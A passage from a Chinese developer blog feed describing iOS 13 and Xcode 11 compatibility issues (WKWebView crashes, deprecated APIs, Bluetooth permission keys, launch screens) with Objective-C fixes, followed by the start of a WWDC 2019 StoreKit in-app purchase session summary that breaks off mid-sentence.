中调试运行时，子线程修改界面会有紫色感叹号标出，注意修改成回到主线程即可。</p><h3 id="8-默认弹出样式打开的页面在-WKWebView-中获取照片崩溃"><a href="#8-默认弹出样式打开的页面在-WKWebView-中获取照片崩溃" class="headerlink" title="8. 默认弹出样式打开的页面在 WKWebView 中获取照片崩溃"></a>8. 默认弹出样式打开的页面在 WKWebView 中获取照片崩溃</h3><p>由于 iOS 13 中<a href="#present">模态视图的默认样式发生改变</a>，如果以默认的 <code>UIModalPresentationPageSheet</code> 样式弹出一个 ViewController，并使用 <code>WKWebView</code> 通过 HTML 获取系统照片：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[_webView loadHTMLString:@&quot;&lt;input accept&#x3D;&#39;image&#x2F;*&#39; type&#x3D;&#39;file&#39;&gt;&quot; baseURL:nil];</span><br></pre></td></tr></table></figure><p>在点击选择按钮时，根据<a href="https://juejin.im/user/5a0a45fe51882578da0d605f" target="_blank" rel="noopener">@伤心的Easyman</a>的反馈，会出现崩溃，崩溃信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Terminating app due to uncaught exception &#39;NSGenericException&#39;, reason: &#39;Your application has presented a UIDocumentMenuViewController (&lt;UIDocumentMenuViewController: 0x101226860&gt;). In its current trait environment, the modalPresentationStyle of a UIDocumentMenuViewController with this style is UIModalPresentationPopover. You must provide location information for this popover through the view controller&#39;s popoverPresentationController. You must provide either a sourceView and sourceRect or a barButtonItem.  If this information is not known when you present the view controller, you may provide it in the UIPopoverPresentationControllerDelegate method -prepareForPopoverPresentation.&#39;</span><br></pre></td></tr></table></figure><p>具体原因是，点击获取系统照片时，会弹出一个模态视图的样式为 <code>UIModalPresentationPopover</code> 的 <code>UIDocumentMenuViewController</code>，这种样式下，如果其父 <code>UIViewController</code> 以非全屏方式 present 的，那么就需要像 iPad 一样指定其 <code>sourceView</code> 和 <code>sourceRect</code>，或者指定一个 <code>barButtonItem</code>，否则会出现上述崩溃。而使用 <code>UIModalPresentationFullScreen</code> 的方式弹出的话就不会有这个问题。</p><h4 id="解决方案-7"><a href="#解决方案-7" class="headerlink" title="解决方案"></a>解决方案</h4><p>第一种方法就是指定<code>sourceView</code>、<code>sourceRect</code>，<code>barButtonItem</code> 同理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">- (void)presentViewController:(UIViewController *)viewControllerToPresent animated:(BOOL)flag completion:(void (^)(void))completion &#123;</span><br><span class="line">    [self setUIDocumentMenuViewControllerSoureViewsIfNeeded:viewControllerToPresent];</span><br><span class="line">    [super presentViewController:viewControllerToPresent animated:flag completion:completion];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">- (void)setUIDocumentMenuViewControllerSoureViewsIfNeeded:(UIViewController *)viewControllerToPresent&#123;</span><br><span class="line">    if (@available(iOS 13, *)) &#123;</span><br><span class="line">        if([UIDevice currentDevice].userInterfaceIdiom &#x3D;&#x3D; UIUserInterfaceIdiomPhone &amp;&amp; [viewControllerToPresent isKindOfClass:UIDocumentMenuViewController.class])&#123;</span><br><span class="line">            viewControllerToPresent.popoverPresentationController.sourceView &#x3D; self.webView;</span><br><span class="line">            viewControllerToPresent.popoverPresentationController.sourceRect &#x3D; CGRectMake(15, 5, 1, 1); &#x2F;&#x2F; 具体看按钮的位置</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; 如果顶层有 UINavigationController 的话，需要如下指定</span><br><span class="line">- (void)presentViewController:(UIViewController *)viewControllerToPresent animated:(BOOL)flag completion:(void (^)(void))completion &#123;</span><br><span class="line">    if([self.viewControllers.lastObject isKindOfClass:WKWebViewController.class])&#123;</span><br><span class="line">        WKWebViewController *vc &#x3D; self.viewControllers.lastObject;</span><br><span class="line">        [vc setUIDocumentMenuViewControllerSoureViewsIfNeeded:viewControllerToPresent];</span><br><span class="line">    &#125;</span><br><span class="line">    [super presentViewController:viewControllerToPresent animated:flag completion:completion];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第二种方法就是使用全屏的方式弹出（实践证明默认弹出样式在横屏下是全屏的不会崩）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- (UIModalPresentationStyle)modalPresentationStyle &#123;</span><br><span class="line">    return UIModalPresentationFullScreen;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-WKWebView-在-iPad-上默认显示桌面版的网页"><a href="#9-WKWebView-在-iPad-上默认显示桌面版的网页" class="headerlink" title="9. WKWebView 在 iPad 上默认显示桌面版的网页"></a>9. WKWebView 在 iPad 上默认显示桌面版的网页</h3><p>在 iPadOS 上，使用 <code>WKWebView</code> 打开网页默认使用桌面版的网页，抓包发现其默认的 UserAgent 变成了 Desktop 版本:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_15) AppleWebKit&#x2F;605.1.15 (KHTML, like Gecko)</span><br></pre></td></tr></table></figure><p>原因是苹果在 iOS 13.0 中为 <code>WKWebView</code> 添加了切换桌面版本和手机版本的方法，其通过在一个新加的枚举值控制:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef NS_ENUM(NSInteger, WKContentMode) &#123;</span><br><span class="line">    WKContentModeRecommended,</span><br><span class="line">    WKContentModeMobile,</span><br><span class="line">    WKContentModeDesktop</span><br><span class="line">&#125; API_AVAILABLE(ios(13.0));</span><br></pre></td></tr></table></figure><p>此枚举默认值为 <code>WKContentModeRecommended</code>，在 iPhone 和 iPad mini 上映射为 <code>WKContentModeMobile</code>，在其他 iPad 上则为 <code>WKContentModeDesktop</code>，因此 iPad 上打开网页默认显示桌面版本。</p><h4 id="解决方案-8"><a href="#解决方案-8" class="headerlink" title="解决方案"></a>解决方案</h4><ol><li>可通过 <code>WKWebViewConfiguration</code> 的新属性 <a href="https://developer.apple.com/documentation/webkit/wkwebviewconfiguration/3194420-defaultwebpagepreferences?language=objc" target="_blank" rel="noopener">defaultWebpagePreferences</a> 来设置，目前其仅包含一个 <code>WKContentMode</code> 类型的属性 <a href="https://developer.apple.com/documentation/webkit/wkwebpagepreferences/3194426-preferredcontentmode?language=objc" target="_blank" rel="noopener">preferredContentMode</a>，默认值为 <code>WKContentModeRecommended</code> 可以通过改变其值来修改显示的版本:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">WKWebViewConfiguration *configuration &#x3D; [[WKWebViewConfiguration alloc] init];</span><br><span class="line">if (@available(iOS 13.0, *)) &#123;</span><br><span class="line">    configuration.defaultWebpagePreferences.preferredContentMode &#x3D; WKContentModeMobile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>除了在初始化时候设置外，还可以通过新的代理方法实现桌面版和移动版切换，苹果给出了一个具体的例子: <a href="https://developer.apple.com/documentation/webkit/viewing_desktop_or_mobile_web_content_using_a_web_view" target="_blank" rel="noopener">Viewing Desktop or Mobile Web Content Using a Web View</a>，其中关键的方法为：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- (void)webView:(WKWebView *)webView decidePolicyForNavigationAction:(WKNavigationAction *)navigationAction preferences:(WKWebpagePreferences *)preferences decisionHandler:(void (^)(WKNavigationActionPolicy, WKWebpagePreferences * _Nonnull))decisionHandler &#123;</span><br><span class="line">    preferences.preferredContentMode &#x3D; WKContentModeMobile;</span><br><span class="line">    decisionHandler(WKNavigationActionPolicyAllow, preferences);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h2 id="方法弃用"><a href="#方法弃用" class="headerlink" title="方法弃用"></a>方法弃用</h2><h3 id="1-UIWebView-将被禁止提交审核"><a href="#1-UIWebView-将被禁止提交审核" class="headerlink" title="1. UIWebView 将被禁止提交审核"></a>1. UIWebView 将被禁止提交审核</h3><p>在 iOS 13 推出后，苹果在 <a href="https://developer.apple.com/documentation/uikit/uiwebview?language=objc" target="_blank" rel="noopener">UIWebView</a> 的说明上将其支持的系统范围定格在了 iOS 2 ~ iOS 12。在 2019 年 12 月 23 日更新的 <a href="https://developer.apple.com/news/?id=12232019b" target="_blank" rel="noopener">News and Updates</a>中，苹果给出了确切的时间节点：</p><blockquote><p>The App Store will no longer accept new apps using UIWebView as of April 2020 and app updates using UIWebView as of December 2020.</p></blockquote><p>2020 年 4 月开始不再接受包含 UIWebView 的<strong>新应用</strong>提交，2020 年 12 月开始不再接受包含 UIWebView 的<strong>应用更新</strong>提交。</p><h4 id="解决方案-9"><a href="#解决方案-9" class="headerlink" title="解决方案"></a>解决方案</h4><p>用 <code>WKWebView</code> 替代 <code>UIWebView</code>，确保所有 <code>UIWebView</code> 的 api 都要移除，如果需要适配 iOS 7 的可以通过 <code>openURL</code> 的方式在 <code>Safari</code> 打开。</p><h3 id="2-使用-UISearchDisplayController-导致崩溃"><a href="#2-使用-UISearchDisplayController-导致崩溃" class="headerlink" title="2. 使用 UISearchDisplayController 导致崩溃"></a>2. 使用 UISearchDisplayController 导致崩溃</h3><p>在 iOS 8 之前，我们在 <code>UITableView</code> 上添加搜索框需要使用 <code>UISearchBar</code> + <code>UISearchDisplayController</code> 的组合方式，而在 iOS 8 之后，苹果就已经推出了 <code>UISearchController</code> 来代替这个组合方式。在 iOS 13 中，如果还继续使用 <code>UISearchDisplayController</code> 会直接导致崩溃，崩溃信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Terminating app due to uncaught exception &#39;NSGenericException&#39;, reason: &#39;UISearchDisplayController is no longer supported when linking against this version of iOS. Please migrate your application to UISearchController.&#39;</span><br></pre></td></tr></table></figure><h4 id="解决方案-10"><a href="#解决方案-10" class="headerlink" title="解决方案"></a>解决方案</h4><p>使用 <code>UISearchController</code> 替换 <code>UISearchBar</code> + <code>UISearchDisplayController</code> 的组合方案。</p><h3 id="3-MPMoviePlayerController-被弃用"><a href="#3-MPMoviePlayerController-被弃用" class="headerlink" title="3. MPMoviePlayerController 被弃用"></a>3. MPMoviePlayerController 被弃用</h3><p>在 iOS 9 之前播放视频可以使用 <code>MediaPlayer.framework</code> 中的MPMoviePlayerController类来完成，它支持本地视频和网络视频播放。但是在 iOS 9 开始被弃用，如果在 iOS 13 中继续使用的话会直接抛出异常：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Terminating app due to uncaught exception &#39;NSInvalidArgumentException&#39;, reason: &#39;MPMoviePlayerController is no longer available. Use AVPlayerViewController in AVKit.&#39;</span><br></pre></td></tr></table></figure><h4 id="解决方案-11"><a href="#解决方案-11" class="headerlink" title="解决方案"></a>解决方案</h4><p>使用 <code>AVFoundation</code> 里的 <code>AVPlayer</code> 作为视频播放控件。</p><h2 id="工程适配"><a href="#工程适配" class="headerlink" title="工程适配"></a>工程适配</h2><h3 id="1-蓝牙权限字段更新导致崩溃以及提交审核失败"><a href="#1-蓝牙权限字段更新导致崩溃以及提交审核失败" class="headerlink" title="1. 蓝牙权限字段更新导致崩溃以及提交审核失败"></a>1. 蓝牙权限字段更新导致崩溃以及提交审核失败</h3><p>在 iOS 13 中，苹果将原来蓝牙申请权限用的 <a href="https://developer.apple.com/documentation/bundleresources/information_property_list/nsbluetoothperipheralusagedescription?language=objc" target="_blank" rel="noopener">NSBluetoothPeripheralUsageDescription</a> 字段，替换为 <a href="https://developer.apple.com/documentation/bundleresources/information_property_list/nsbluetoothalwaysusagedescription?language=objc" target="_blank" rel="noopener">NSBluetoothAlwaysUsageDescription</a> 字段。</p><blockquote><p>For apps with a deployment target of iOS 13 and later, use NSBluetoothAlwaysUsageDescription instead.</p></blockquote><p>感谢 <a href="https://juejin.im/user/590062eeda2f60005ddf10bd" target="_blank" rel="noopener">@dengChaoJie</a> 的反馈，如果在 iOS 13 中使用旧的权限字段获取蓝牙权限，会导致崩溃，崩溃信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This app has crashed because it attempted to access privacy-sensitive data without a usage description.  The app&#39;s Info.plist must contain an NSBluetoothAlwaysUsageDescription key with a string value explaining to the user how the app uses this data.</span><br></pre></td></tr></table></figure><p>另外，如果将没有新字段的包提交审核，将会收到包含 <code>ITMS-90683</code> 的邮件，并提示审核不通过。</p><blockquote><p>Dear Developer,</p><p>We identified one or more issues with a recent delivery for your app, “xxx”. Please correct the following issues, then upload again.</p><p>ITMS-90683: Missing Purpose String in Info.plist - Your app’s code references one or more APIs that access sensitive user data. The app’s Info.plist file should contain a NSBluetoothAlwaysUsageDescription key with a user-facing purpose string explaining clearly and completely why your app needs the data. Starting Spring 2019, all apps submitted to the App Store that access user data are required to include a purpose string. If you’re using external libraries or SDKs, they may reference APIs that require a purpose string. While your app might not use these APIs, a purpose string is still required. You can contact the developer of the library or SDK and request they release a version of their code that doesn’t contain the APIs. Learn more (<a href="https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy" target="_blank" rel="noopener">https://developer.apple.com/documentation/uikit/core_app/protecting_the_user_s_privacy</a>).</p><p>Best regards,</p><p>The App Store Team</p></blockquote><h4 id="解决方案-12"><a href="#解决方案-12" class="headerlink" title="解决方案"></a>解决方案</h4><p>官网文档也有说明，就是在 Info.plist 中把两个字段都加上。</p><blockquote><p>For deployment targets earlier than iOS 13, add both NSBluetoothAlwaysUsageDescription and NSBluetoothPeripheralUsageDescription to your app’s Information Property List file. </p></blockquote><h3 id="2-CNCopyCurrentNetworkInfo-使用要求更严格"><a href="#2-CNCopyCurrentNetworkInfo-使用要求更严格" class="headerlink" title="2. CNCopyCurrentNetworkInfo 使用要求更严格"></a>2. CNCopyCurrentNetworkInfo 使用要求更严格</h3><p>从 iOS 12 开始，<code>CNCopyCurrentNetworkInfo</code> 函数需要开启 <a href="https://developer.apple.com/documentation/bundleresources/entitlements/com_apple_developer_networking_wifi-info?language=objc" target="_blank" rel="noopener">Access WiFi Information</a> 的功能后才会返回正确的值。在 iOS 13 中，这个函数的使用要求变得更严格，根据 <a href="https://developer.apple.com/documentation/systemconfiguration/1614126-cncopycurrentnetworkinfo?language=occ" target="_blank" rel="noopener">CNCopyCurrentNetworkInfo</a> 文档说明，应用还需要符合下列三项条件中的至少一项才能得到正确的值：</p><ul><li>使用 <a href="https://developer.apple.com/documentation/corelocation?language=objc" target="_blank" rel="noopener">Core Location</a> 的应用， 并获得定位服务权限。</li><li>使用 <a href="https://developer.apple.com/documentation/networkextension/nehotspotconfiguration?language=objc" target="_blank" rel="noopener">NEHotspotConfiguration</a> 来配置 WiFi 网络的应用。</li><li>目前正处于启用状态的 VPN 应用。</li></ul><p>苹果作出这项改变主要为了保障用户的安全，因为根据 MAC 地址容易推算出用户当前所处的地理位置。同样，蓝牙设备也具有 MAC 地址，所以苹果也为蓝牙添加了新的权限，可见上一点。</p><h4 id="解决方案-13"><a href="#解决方案-13" class="headerlink" title="解决方案"></a>解决方案</h4><p>根据应用需求，添加三项要求其中一项。可以选择第一项获取定位权限，因为添加的成本不会太大，只需要用户允许应用使用定位服务即可。</p><h3 id="3-LaunchImage-被弃用"><a href="#3-LaunchImage-被弃用" class="headerlink" title="3. LaunchImage 被弃用"></a>3. LaunchImage 被弃用</h3><p>iOS 8 之前我们是在<code>LaunchImage</code> 来设置启动图，每当苹果推出新的屏幕尺寸的设备，我们需要 assets 里面放入对应的尺寸的启动图，这是非常繁琐的一个步骤。因此在 iOS 8 苹果引入了 <code>LaunchScreen</code>，可以直接在 Storyboard 上设置启动界面样式，可以很方便适配各种屏幕。</p><p>需要注意的是，苹果在 <a href="https://developer.apple.com/videos/play/wwdc2019/224/" target="_blank" rel="noopener">Modernizing Your UI for iOS 13</a>   section 中提到<br>，从2020年4月开始，所有支持 iOS 13 的 App 必须提供 <code>LaunchScreen.storyboard</code>，否则将无法提交到 App Store 进行审批。</p><p><img src="https://user-gold-cdn.xitu.io/2019/9/25/16d66db08104201c?w=300&h=219&f=png&s=22784" alt="Modernizing Your UI for iOS 13"></p><h4 id="解决方案-14"><a href="#解决方案-14" class="headerlink" title="解决方案"></a>解决方案</h4><p>使用 <code>LaunchScreen.storyboard</code> 设置启动页，弃用 <code>LaunchImage</code>。</p><h3 id="4-UISegmentedControl-默认样式改变"><a href="#4-UISegmentedControl-默认样式改变" class="headerlink" title="4. UISegmentedControl 默认样式改变"></a>4. UISegmentedControl 默认样式改变</h3><p>默认样式变为白底黑字，如果设置修改过颜色的话，页面需要修改。</p><p><img src="https://user-gold-cdn.xitu.io/2019/9/25/16d66db081765de4?w=300&h=114&f=png&s=7081" alt="UISegmentedControl"></p><p>原本设置选中颜色的 <code>tintColor</code> 已经失效，新增了  <a href="https://developer.apple.com/documentation/uikit/uisegmentedcontrol/3335209-selectedsegmenttintcolor?language=objc" target="_blank" rel="noopener">selectedSegmentTintColor</a> 属性用以修改选中的颜色。</p><h3 id="5-Xcode-11-创建的工程在低版本设备上运行黑屏"><a href="#5-Xcode-11-创建的工程在低版本设备上运行黑屏" class="headerlink" title="5. Xcode 11 创建的工程在低版本设备上运行黑屏"></a>5. Xcode 11 创建的工程在低版本设备上运行黑屏</h3><p>使用 Xcode 11 创建的工程，运行设备选择 iOS 13.0 以下的设备，运行应用时会出现黑屏。这是因为 Xcode 11 默认是会创建通过 <code>UIScene</code> 管理多个 <code>UIWindow</code> 的应用，工程中除了 <code>AppDelegate</code> 外会多一个 <code>SceneDelegate</code>： </p><p><img src="https://user-gold-cdn.xitu.io/2019/9/25/16d66db082168a94" alt="Scene Delegate"></p><p>这是为了 iPadOS 的多进程准备的，也就是说 <code>UIWindow</code> 不再是 <code>UIApplication</code> 中管理，但是旧版本根本没有 <code>UIScene</code>。</p><h4 id="解决方案-15"><a href="#解决方案-15" class="headerlink" title="解决方案"></a>解决方案</h4><p>在 <code>AppDelegate</code> 的头文件加上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@property (strong, nonatomic) UIWindow *window;</span><br></pre></td></tr></table></figure><h3 id="6-Xcode-11-2-编译的工程在-iOS-13-2-之前版本的设备上会出现崩溃。"><a href="#6-Xcode-11-2-编译的工程在-iOS-13-2-之前版本的设备上会出现崩溃。" class="headerlink" title="6. Xcode 11.2 编译的工程在 iOS 13.2 之前版本的设备上会出现崩溃。"></a>6. Xcode 11.2 编译的工程在 iOS 13.2 之前版本的设备上会出现崩溃。</h3><p>如果工程的 <code>storyboard</code> 中包含 <code>UITextView</code>，并使用 Xcode 11.2 编译打包，那么 App 在 <code>iOS 13.2</code> 之前版本的设备会出现崩溃，崩溃信息如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*** Terminating app due to uncaught exception &#39;NSInvalidUnarchiveOperationException&#39;, reason: &#39;Could not instantiate class named _UITextLayoutView because no class named _UITextLayoutView was found; the class needs to be defined in source code or linked in from a library (ensure the class is part of the correct target)&#39;</span><br></pre></td></tr></table></figure><p>这个问题是 Xcode 的锅，苹果在此后紧急发布 Xcode 11.2.1 版本进行修复，Xcode 11.2 在 2019 年 11 月 5 日被正式弃用。目前如果仍然使用 Xcode 11.2 打包提审，会收到包含 <code>ERROR</code> <code>ITMS-90534</code> 和 <code>WARNING</code> <code>ITMS-90703</code> 的拒绝信息，相同案例可见 <a href="https://stackoverflow.com/questions/58748560/app-store-app-uploading-failed-with-error-itms-90534-and-warning-itms-90703" target="_blank" rel="noopener">stackoverflow</a>。</p><h4 id="解决方案-16"><a href="#解决方案-16" class="headerlink" title="解决方案"></a>解决方案</h4><p>更新至 Xcode 11.2.1 版本打包提审。</p><h2 id="SDK-适配"><a href="#SDK-适配" class="headerlink" title="SDK 适配"></a>SDK 适配</h2><h3 id="1-使用-available-导致旧版本-Xcode-编译出错"><a href="#1-使用-available-导致旧版本-Xcode-编译出错" class="headerlink" title="1.  使用 @available 导致旧版本 Xcode 编译出错"></a>1.  使用 <code>@available</code> 导致旧版本 Xcode 编译出错</h3><p>在 Xcode 11 的 SDK 工程的代码里面使用了 <code>@available</code> 判断当前系统版本，打出来的包放在 Xcode 10 中编译，会出现一下错误：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Undefine symbols for architecture i386:</span><br><span class="line">    &quot;__isPlatformVersionAtLeast&quot;, referenced from:</span><br><span class="line">        ...</span><br><span class="line">ld: symbol(s) not found for architecture i386</span><br></pre></td></tr></table></figure><p>从错误信息来看，是 <code>__isPlatformVersionAtLeast</code> 方法没有具体的实现，但是工程里根本没有这个方法。实际测试无论在哪里使用<code>@available</code> ，并使用 Xcode 11 打包成动态库或静态库，把打包的库添加到 Xcode 10 中编译都会出现这个错误，因此可以判断是 iOS 13 的 <code>@available</code> 的实现中使用了新的 api。</p><h4 id="解决方案-17"><a href="#解决方案-17" class="headerlink" title="解决方案"></a>解决方案</h4><p>如果你的 SDK 需要适配旧版本的 Xcode，那么需要避开此方法，通过获取系统版本来进行判断：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if ([UIDevice currentDevice].systemVersion.floatValue &gt;&#x3D; 13.0) &#123;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>另外，在 Xcode 10 上打开 SDK 工程也应该可以正常编译，这就需要加上编译宏进行处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#ifndef __IPHONE_13_0</span><br><span class="line">#define __IPHONE_13_0 130000</span><br><span class="line">#endif</span><br><span class="line"></span><br><span class="line">#if __IPHONE_OS_VERSION_MAX_ALLOWED &gt;&#x3D; __IPHONE_13_0</span><br><span class="line">...</span><br><span class="line">#endif</span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>本文结合个人遇到的问题和以下文章部分内容，对常见适配问题进行总结</p><ul><li><a href="https://www.jianshu.com/p/a0cc0f4e99c7" target="_blank" rel="noopener">iOS 13 适配</a></li><li><a href="https://www.jianshu.com/p/4654f8f6e16e" target="_blank" rel="noopener">iOS13适配</a></li><li><a href="https://blog.csdn.net/weixin_34258782/article/details/93169199" target="_blank" rel="noopener">适配 iOS13</a></li><li><a href="http://devhy.com/33-xcode11-and-ios13/" target="_blank" rel="noopener">Xcode11 和 iOS13 适配</a></li><li><a href="https://tomee.shop/ios13-adaptation/" target="_blank" rel="noopener">iOS13 UI &amp; 功能适配</a></li><li><a href="https://blog.csdn.net/qq_18683985/article/details/97374288" target="_blank" rel="noopener">解决Xcode11-beta版本新创建iOS工程低版本黑屏的问题</a></li><li><a href="https://xiaozhuanlan.com/topic/5671830492" target="_blank" rel="noopener">Modernizing Your UI for iOS13</a></li><li><a href="https://blog.cyaron.xyz/2019/08/01/cncopycurrentnetworkinfo-on-ios-13/" target="_blank" rel="noopener">CNCopyCurrentNetworkInfo 在 iOS 13 中的新特性以及 App 无法获取 Wi-Fi 信息的解决办法</a></li><li><a href="http://erichuang.top/2019/08/05/Objective-C/2019/iOS13%E9%80%82%E9%85%8D/" target="_blank" rel="noopener">iOS13适配</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;meta name=&quot;referrer&quot; content=&quot;no-referrer&quot;&gt;
本文在 [掘金](https://juejin.im/user/5d8af836518825093a357646/posts) 也持续更新。
## iOS 13 支持适配的机型
* iPho
      
    
    </summary>
    
    
    
      <category term="Technology" scheme="http://xsenyu.github.io/tags/Technology/"/>
    
  </entry>
  
  <entry>
    <title>WWDC 2019 Session 302 -- In-App Purchases and Using Server-to-Server Notifications</title>
    <link href="http://xsenyu.github.io/2019/07/25/WWDC%202019%20Session%20302-%20In-App%20Purchases%20and%20Using%20Server-to-Server%20Notifications/"/>
    <id>http://xsenyu.github.io/2019/07/25/WWDC%202019%20Session%20302-%20In-App%20Purchases%20and%20Using%20Server-to-Server%20Notifications/</id>
    <published>2019-07-25T06:43:00.000Z</published>
    <updated>2020-04-06T08:53:35.774Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h2><p>本章节包括以下内容：</p><ul><li>使用新属性 <code>SKStorefront</code> 来为不同地区的用户提供对应的商品</li><li>应用收据中将添加应用预购的信息（watchOS 6.0 也将支持预购）</li><li>使用服务端对服务端的通知来管理用户订阅状态</li><li>订阅生命周期的讲解</li><li>订阅服务新特性：账单缓冲期</li></ul><p>其中，最重要的就是服务端对服务端通知的新类型，其他特性业界基本都有手动实现的方案，现在只不过更方便成本更低。而服务端对服务端通知新类型的添加，则对用户订阅状态的管理方案带来了实质性进步，因此苹果也为此处分配了很长的篇幅。其次是账单缓冲期，可以为我们带来额外的收益。</p><h2 id="What’s-new-in-StoreKit"><a href="#What’s-new-in-StoreKit" class="headerlink" title="What’s new in StoreKit"></a>What’s new in StoreKit</h2><h3 id="Subscription-Offers（订阅优惠）"><a href="#Subscription-Offers（订阅优惠）" class="headerlink" title="Subscription Offers（订阅优惠）"></a>Subscription Offers（订阅优惠）</h3><p>从 iOS 12.2、tvOS 12.2、macOS 10.14.4 开始，为了帮助应用保持订阅数量，挽回订阅流失，苹果为应用内订阅服务提供了订阅优惠的支持，包括一定时长的免费试用、一定时长的低价订阅等十种类型的优惠方案。开发者可以在 iTunes Connect 里为订阅类型的商品设置促销，促销对新用户和曾经订阅过的老用户有效。苹果会自动判断当前用户是否符合优惠条件，从而在调起系统的内购面板时，自动展示促销文案或者正常价格。</p><h3 id="SKStorefront"><a href="#SKStorefront" class="headerlink" title="SKStorefront"></a>SKStorefront</h3><p><a href="https://developer.apple.com/documentation/storekit/skstorefront?language=objc" target="_blank" rel="noopener">SKStorefront</a> 用于描述当前用户 App Store 的店面信息，目前它只有一个 <code>countryCode</code> 属性可用，这是一个三字符的国家地区编码，<strong>表示用户的应用商店所设置的国家或者地区</strong>。苹果为 <code>SKPaymentQueue</code> 对象添加了一个<code>SKStorefront</code>类型的属性，名为 <code>storefront</code>。 未来应该会有更多的属性被添加进来。</p><p>苹果给出了示例，在进行内购商品展示前，主动获取 <code>SKStorefront</code>的<code>countryCode</code>， 然后对内购商品一一核对，确定该商品在当前国家是否要提供。这样一来，内购商品的展示逻辑就放在了客户端。很多公司出于灵活性等考虑，商品列表的数据是放在服务端的，这样可以随时配置线上的商品，而对于不同国家展示不同商品这个需求，之前也有很容易实现的方案，举个例子：服务端根据请求的 ip 判断所处地区，动态返回对应地区的商品列表。</p><h4 id="paymentQueueDidChangeStorefront"><a href="#paymentQueueDidChangeStorefront" class="headerlink" title="paymentQueueDidChangeStorefront"></a>paymentQueueDidChangeStorefront</h4><p>由于在程序运行期间，<code>SKStorefront</code> 也可能发生变化（比如用户更改了自己 App Store 的设置），所以苹果在 <code>SKPaymentTransactionObserver</code> 协议添加了一个新方法：<code>- paymentQueueDidChangeStorefront:</code>，用来通知应用 <code>SKStorefront</code> 发生了变化。在此方法中，可以重新对商品的地区信息进行核对，确保显示的是正确商品。</p><h4 id="SKPaymentQueueDelegate"><a href="#SKPaymentQueueDelegate" class="headerlink" title="SKPaymentQueueDelegate"></a>SKPaymentQueueDelegate</h4><p>如果在一次内购进行的过程中 <code>SKStorefront</code> 发生了变化，应用可能会对本次交易的内容做出调整，比如用户把 App Store 切换到另一个国家，你就不想让他买这个商品了。对此，苹果添加了一个新的协议：<code>SKPaymentQueueDelegate</code>，用于对交易过程中 storefront 信息变化时作出响应。</p><p>该协议中目前只有一个方法： <code>- paymentQueue:shouldContinueTransaction:inStorefront:</code>，当内购进行期间 storefront 发生变化的时候被调用，你可以通过返回值告知系统是否希望此种情况下交易继续进行。如果你为这个方法返回了 true，用户的购买行为正常继续。如果返回了 false，那么此次购买就会终止。</p><p>需要强调的一点是，出于用户体验的考虑，这个方法需要尽快返回。因此，诸如网络请求询问服务端的处理方式可能会造成延迟，苹果建议事先把验证需要的相关信息缓存在本地，然后这部分的验证可以直接在应用中进行。</p><p>当你返回了false后，<code>- paymentQueue:updatedTransactions:</code> 方法被调用，你会收到一个被标记为失败的 transaction，错误码是 